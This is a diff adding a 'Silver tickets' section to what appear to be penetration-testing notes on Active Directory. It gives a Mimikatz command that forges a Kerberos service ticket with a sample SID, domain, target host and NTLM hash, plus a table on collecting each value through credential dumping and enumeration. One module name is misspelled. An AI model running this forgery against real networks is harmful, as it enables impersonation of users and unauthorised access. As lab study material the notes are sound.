@@ -68,3 +68,21 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
 
 
 ### Silver tickets
+#### When to use:
+- If a service hash was found, but no access to the server with the compromised users
+
+```
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+```
+- To check if the ticket is enabled in memory, use the `klist`
+- If the target is HTTP, use `iwr -UseDefaultCredentials http://TARGET`
+
+| Argument   | Description                                         | Example                                    | Command                                                          |
+| ---------- | --------------------------------------------------- | ------------------------------------------ | ---------------------------------------------------------------- |
+| `/sid`     | The domain SID (the user SID without the last part) | `S-1-5-21-1987370270-658905905-1781884369` | `whoami /user`                                                   |
+| `/domain`  | The domain name                                     | `corp.com`                                 | `Get-Domain`                                                     |
+| `/ptt`     | Enable passing the ticket                           |                                            |                                                                  |
+| `/target`  | The full name of the target machine                 | `web04.corp.com`                           | `Get-NetUser -SPN \| select samaccountname,serviceprincipalname` |
+| `/service` | The protocol of the SPN                             | `http`                                     | `Get-NetUser -SPN \| select samaccountname,serviceprincipalname` |
+| `/rc4`     | The NTLM hash of the SPN                            | `4d28cf5252d39971419580a51484ca09`         | `sekursla::logonpasswords`                                       |
+| `/user`    | The user, can be any.                               | `jeff`                                     | `Get-DomainUser`                                                 |
